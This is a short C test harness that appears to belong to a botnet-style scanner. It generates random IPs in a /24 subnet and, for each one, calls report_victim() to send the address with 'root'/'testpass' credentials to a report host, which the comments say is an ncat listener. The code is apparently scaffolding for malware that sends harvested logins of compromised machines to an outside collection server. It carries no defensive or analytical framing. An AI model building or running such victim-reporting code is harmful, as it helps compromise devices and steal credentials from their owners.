#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#include "scanner.h"

// Copied from scanner.c for the test binary
static uint32_t prefix_to_mask(int prefix_len) {
    if (prefix_len == 0) return 0;
    return (~0U) << (32 - prefix_len);
}

// needs to be here for testing :p
static uint32_t random_ip_in_subnet(uint32_t subnet, uint32_t mask) {
    uint32_t host_part = rand() & ~mask;
    if (host_part == 0 || host_part == ~mask) host_part = 1;
    return (subnet & mask) | host_part;
}

int main(void) {
    srand(time(NULL));

    const char *subnet_str = "172.20.0.0";
    int prefix_len         = 24;

    uint32_t subnet = ntohl(inet_addr(subnet_str));
    uint32_t mask   = prefix_to_mask(prefix_len);

    printf("[*] Generating 5 random IPs in %s/%d\n\n", subnet_str, prefix_len);

    for (int i = 0; i < 5; i++) {
        uint32_t ip = random_ip_in_subnet(subnet, mask);

        struct in_addr in = { .s_addr = htonl(ip) };
        printf("[%d] Generated IP: %s\n", i + 1, inet_ntoa(in));

        // Test reporting — send to your ncat listener
        report_victim(ip, "root", "testpass");
        printf("    -> Reported to %s:%d\n", REPORT_HOST, REPORT_PORT);
    }

    printf("\n[*] Done. Check your ncat output.\n");
    return 0;
}
